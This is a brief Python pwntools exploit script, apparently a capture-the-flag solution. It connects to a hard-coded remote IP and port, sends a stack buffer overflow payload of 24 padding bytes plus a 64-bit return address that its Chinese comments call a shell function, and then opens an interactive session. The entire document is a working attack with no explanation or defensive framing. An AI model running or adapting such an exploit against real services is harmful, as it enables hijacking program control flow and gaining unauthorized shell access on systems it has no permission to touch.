from pwn import *

def exploit():
    r = remote("124.16.75.117", 51006)

    offset = 24 # 偏移量，填充到ret地址
    flag_addr = 0x004005b6 # shell函数地址

    payload = b"$" * offset + p64(flag_addr)

    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit()